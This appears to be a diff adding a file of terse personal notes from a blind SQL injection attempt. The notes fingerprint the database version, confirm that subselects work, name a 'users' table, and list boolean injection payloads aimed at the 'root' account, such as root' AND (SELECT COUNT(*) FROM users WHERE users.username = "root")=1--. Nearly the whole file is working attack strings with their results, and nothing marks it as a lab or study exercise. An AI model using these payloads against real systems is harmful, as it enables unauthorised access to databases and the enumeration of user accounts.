@@ -1,0 +1,14 @@
+not mysql?
+
+substring(@@version,1,1)=4
+1 - 7 failed
+
+subselect works
+(select 1)=1
+
+TABLE IS CALLED users
+root' AND (select 1 from users limit 0,1)=1--
+
+root' AND  (SELECT COUNT(*) FROM users WHERE users.username = "root")=1--
+
+
